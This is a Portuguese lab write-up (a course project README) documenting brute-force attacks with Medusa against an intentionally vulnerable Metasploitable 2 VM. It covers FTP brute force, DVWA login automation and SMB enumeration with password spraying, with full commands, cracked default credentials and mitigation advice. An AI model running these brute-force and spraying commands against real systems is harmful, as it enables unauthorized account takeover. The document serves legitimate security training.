# 🔐 Desafio Prático DIO — Força Bruta com Medusa em Ambiente Controlado

> Projeto prático da formação Cybersecurity da DIO: auditoria de segurança com **Medusa** contra um ambiente vulnerável **Metasploitable 2**, simulando ataques de força bruta em FTP, formulário web (DVWA) e password spraying em SMB — com documentação completa e recomendações de mitigação.

---

## ⚠️ Aviso Legal e Ético

**Este projeto foi executado exclusivamente em laboratório autorizado.**

- 🎯 Alvo: VM Linux isolada (`172.17.54.106`) em rede interna, fornecida pela DIO para o desafio.
- ✅ Permissão explícita de ataque concedida pelo instrutor/plataforma.
- 🚫 **NÃO** executar nenhum comando deste repositório contra sistemas de terceiros.
- 📚 Finalidade: **educacional** — compreender ataques de força bruta para melhor defendê-los.
- 🔒 Nenhuma credencial real ou dado sensível está exposto aqui (as credenciais são padrões do Metasploitable 2).

---

## 📋 Sumário

1. [Objetivo](#objetivo)
2. [Ambiente](#ambiente)
3. [Ferramentas](#ferramentas)
4. [Estrutura do Repositório](#estrutura-do-repositório)
5. [Reconhecimento Inicial](#reconhecimento-inicial)
6. [Cenário 1 — Força Bruta FTP](#cenário-1--força-bruta-ftp)
7. [Cenário 2 — Automação Web (DVWA)](#cenário-2--automação-web-dvwa)
8. [Cenário 3 — Enumeração SMB + Password Spraying](#cenário-3--enumeração-smb--password-spraying)
9. [Resultados Consolidados](#resultados-consolidados)
10. [Recomendações de Mitigação](#recomendações-de-mitigação)
11. [Aprendizados](#aprendizados)
12. [Como Reproduzir](#como-reproduzir)
13. [Licença](#licença)

---

## 🎯 Objetivo

Demonstrar, em ambiente controlado, a aplicação prática de ataques de força bruta em diferentes serviços e documentar:

- Compreender ataques de força bruta em **FTP**, **Web** e **SMB**;
- Utilizar **Kali Linux** e **Medusa** para auditoria de segurança;
- Documentar processos técnicos de forma clara e estruturada;
- Reconhecer vulnerabilidades comuns e propor **medidas de mitigação**.

---

## 🖥️ Ambiente

| Item | Detalhe |
|---|---|
| **Atacante** | Kali Linux — `172.17.62.15` |
| **Alvo** | Metasploitable 2 — `172.17.54.106` (MAC `00:15:5D:01:0D:13`) |
| **Host do alvo** | `metasploitable.localdomain` |
| **Ferramenta principal** | Medusa v2.3 |
| **Sistema do alvo** | Linux (Ubuntu 8.04, intencionalmente vulnerável) |

> O Metasploitable 2 é uma VM criada pela Rapid7 para treinamento. **Nunca deve ser exposta à internet.**

---

## 🛠️ Ferramentas

- **Medusa v2.3** — força bruta em rede (módulos `ftp`, `smbnt`, `web-form`)
- **nmap** — reconhecimento de portas e serviços
- **enum4linux** — enumeração SMB (RID cycling)
- **smbclient** — validação de acesso a compartilhamentos
- **ftp** — validação de login FTP
- **Python 3 + requests** — automação do formulário web (alternativa ao Medusa)
- **ImageMagick** — renderização das capturas de evidência em `images/`

---

## 📁 Estrutura do Repositório

```
.
├── README.md                          # este arquivo
├── Relatorio_Desafio_DIO_Medusa.pdf   # relatório completo (5 páginas)
├── automacao_dvwa.py                  # script de automação do formulário DVWA
├── wordlists/
│   ├── usuarios.txt                   # 10 usuários (cenário FTP/web)
│   ├── senhas.txt                     # 12 senhas (cenário FTP/web)
│   └── usuarios_smb.txt               # 35 usuários enumerados via SMB
├── evidencia/
│   ├── 00_nmap_inicial.txt            # portas e versões
│   ├── 01_ftp_bruteforce.txt          # saída do Medusa (FTP)
│   ├── 02_ftp_validacao.txt           # login + listagem FTP
│   ├── 03_dvwa_webform.txt            # limitação do Medusa web-form (302)
│   ├── 04_smb_enum.txt                # enum4linux -U
│   ├── 05_smb_spray.txt               # password spraying SMB
│   ├── 06_smb_validacao.txt           # smbclient -L
│   └── 07_dvwa_automacao_script.txt   # saída do script Python
└── images/                            # capturas das evidências (PNG)
    ├── 01_ftp_bruteforce.png
    ├── 02_ftp_validacao.png
    ├── 04_smb_enum.png
    ├── 05_smb_spray.png
    ├── 06_smb_validacao.png
    └── 07_dvwa_automacao_script.png
```

---

## 🔍 Reconhecimento Inicial

```bash
nmap -Pn -sV --top-ports 100 172.17.54.106
```

**Portas relevantes identificadas:**

| Porta | Serviço | Versão |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 Debian |
| 23 | Telnet | Linux telnetd |
| 80 | HTTP | Apache httpd 2.2.8 (Ubuntu) DAV/2 |
| 139/445 | SMB | Samba smbd 3.X (WORKGROUP) |
| 3306 | MySQL | MySQL 5.0.51a |
| 5432 | PostgreSQL | PostgreSQL 8.3 |
| 5900 | VNC | VNC protocol 3.3 |

📄 Evidência: [`evidencia/00_nmap_inicial.txt`](evidencia/00_nmap_inicial.txt)

---

## 🔓 Cenário 1 — Força Bruta FTP

### Comando

```bash
medusa -h 172.17.54.106 \
  -U wordlists/usuarios.txt \
  -P wordlists/senhas.txt \
  -M ftp -t 6 -f
```

- `-U` / `-P`: listas de usuários e senhas
- `-M ftp`: módulo FTP
- `-t 6`: 6 threads paralelas
- `-f`: para no primeiro sucesso (fail-fast)

### Resultado

```
ACCOUNT FOUND: [ftp] Host: 172.17.54.106 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação

```bash
ftp -inv 172.17.54.106
# user msfadmin msfadmin → 230 Login successful
# pwd → /home/msfadmin ; ls → diretório "vulnerable"
```

📄 Evidências: [`01_ftp_bruteforce.txt`](evidencia/01_ftp_bruteforce.txt) · [`02_ftp_validacao.txt`](evidencia/02_ftp_validacao.txt) · 🖼️ [`images/01_ftp_bruteforce.png`](images/01_ftp_bruteforce.png)

---

## 🌐 Cenário 2 — Automação Web (DVWA)

### Tentativa com Medusa web-form

```bash
medusa -h 172.17.54.106 \
  -U wordlists/usuarios.txt -P wordlists/senhas.txt \
  -M web-form \
  -m FORM:"dvwa/login.php" \
  -m "FORM-DATA:post?username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Login failed" -t 6 -f
```

**Limitação encontrada:** o módulo `web-form` do Medusa v2.3 não interpreta corretamente o redirecionamento **HTTP 302** do DVWA e reporta `error code 302` para todas as tentativas. Isso está documentado como comportamento da ferramenta — não como falha do ataque.

📄 Evidência: [`03_dvwa_webform.txt`](evidencia/03_dvwa_webform.txt)

### Adaptação — script Python

O desafio permite adaptar as ferramentas. Foi criado [`automacao_dvwa.py`](automacao_dvwa.py), que envia POST com `allow_redirects=False` e detecta o sucesso pelo cabeçalho:

- ✅ Correto → `Location: index.php`
- ❌ Errado → `Location: login.php`

```bash
python3 automacao_dvwa.py
```

**Resultado:** `admin:password` — 1 credencial válida em 48 tentativas.

📄 Evidência: [`07_dvwa_automacao_script.txt`](evidencia/07_dvwa_automacao_script.txt)

---

## 🗂️ Cenário 3 — Enumeração SMB + Password Spraying

### 3.1 Enumeração de usuários

```bash
enum4linux -U 172.17.54.106
# 35 usuários extraídos via Samba RID cycling
```

📄 Evidência: [`04_smb_enum.txt`](evidencia/04_smb_enum.txt)

### 3.2 Password spraying

```bash
medusa -h 172.17.54.106 \
  -U wordlists/usuarios_smb.txt \
  -p msfadmin \
  -M smbnt -t 6
```

> **Password spraying** = testar **uma senha** contra **muitos usuários**, ao contrário da força bruta (muitas senhas contra um usuário). É mais furtivo porque evita travamento de contas.

### Resultado

```
ACCOUNT FOUND: [smbnt] User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Validação

```bash
smbclient -L //172.17.54.106 -U msfadmin%msfadmin
# Compartilhamentos: print$, tmp, opt, IPC$, ADMIN$, msfadmin
```

📄 Evidências: [`05_smb_spray.txt`](evidencia/05_smb_spray.txt) · [`06_smb_validacao.txt`](evidencia/06_smb_validacao.txt)

---

## 📊 Resultados Consolidados

| Cenário | Serviço | Credencial descoberta | Status |
|---|---|---|---|
| 1 — FTP | vsftpd 2.3.4 (21/tcp) | `msfadmin:msfadmin` | ✅ SUCESSO |
| 2 — DVWA | Apache/PHP (80/tcp) | `admin:password` | ✅ SUCESSO (script) |
| 3 — SMB | Samba 3.0.20 (445/tcp) | `msfadmin:msfadmin` (ADMIN$) | ✅ SUCESSO |

> **Observação:** a credencial `msfadmin:msfadmin` funcionou em **dois serviços diferentes** — demonstrando na prática o risco da **reutilização de credenciais**.

---

## 🛡️ Recomendações de Mitigação

### Força bruta e password spraying
- Política de senhas fortes, **únicas por serviço**, com rotação periódica.
- **Rate limiting** e bloqueio progressivo por IP/conta (ex.: fail2ban).
- Monitorar logs de autenticação e alertar sobre picos de falhas.
- Desabilitar serviços desnecessários (telnet, rlogin, FTP em texto claro).

### FTP
- Substituir FTP por **SFTP/FTPS**.
- Proibir login de contas do sistema no FTP.
- Manter o vsftpd atualizado.

### SMB
- Restringir `ADMIN$` apenas a administradores.
- Habilitar **SMB signing** e desabilitar **SMBv1**.
- Aplicar princípio do **menor privilégio** em contas de serviço.

### Aplicações web
- Bloqueio de conta após N tentativas falhas.
- **MFA** para painéis administrativos.
- Logging e alertas de autenticação.

### Geral
- Manter sistemas atualizados — o Metasploitable 2 é intencionalmente vulnerável e **nunca** deve ser exposto em produção.
- Segmentar redes e usar firewall entre zonas.

---

## 🎓 Aprendizados

1. **Enumeração antes da exploração:** o RID cycling do SMB transformou 1 senha em acesso administrativo ao revelar 35 usuários.
2. **Senhas fracas são o vetor mais comum:** `msfadmin:msfadmin` e `admin:password` caíram em segundos.
3. **Reutilização de credenciais amplia o impacto:** a mesma credencial abriu FTP e SMB.
4. **Ferramentas têm limitações:** o Medusa web-form falhou com 302; entender o protocolo HTTP permitiu adaptar com Python.
5. **Documentar é parte do pentest:** cada comando, saída e validação foi preservado como evidência.
6. **Password spraying > força bruta cega:** menos ruído, mais eficiência, menor risco de lockout.

---

## ▶️ Como Reproduzir (apenas em laboratório autorizado)

```bash
# 1. Clone o repositório
git clone https://github.com/<seu-usuario>/<este-repo>.git
cd <este-repo>

# 2. Confirme o alcance ao alvo
ping -c 2 172.17.54.106

# 3. Reconhecimento
nmap -Pn -sV --top-ports 100 172.17.54.106

# 4. Cenário 1 — FTP
medusa -h 172.17.54.106 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 6 -f

# 5. Cenário 2 — DVWA (script)
python3 automacao_dvwa.py

# 6. Cenário 3 — SMB
enum4linux -U 172.17.54.106
medusa -h 172.17.54.106 -U wordlists/usuarios_smb.txt -p msfadmin -M smbnt -t 6
```

> ⚠️ Substitua o IP pelo do **seu próprio laboratório**. Nunca execute contra alvos não autorizados.

---

## 📄 Licença

Projeto educacional publicado sob a licença **MIT**.  
Conteúdo criado para o desafio prático da **DIO — Formação Cybersecurity**.

---

<div align="center">

**🔐 Segurança é responsabilidade de quem entende o ataque.**

Feito com Kali Linux · Medusa · Metasploitable 2 · DIO

</div>
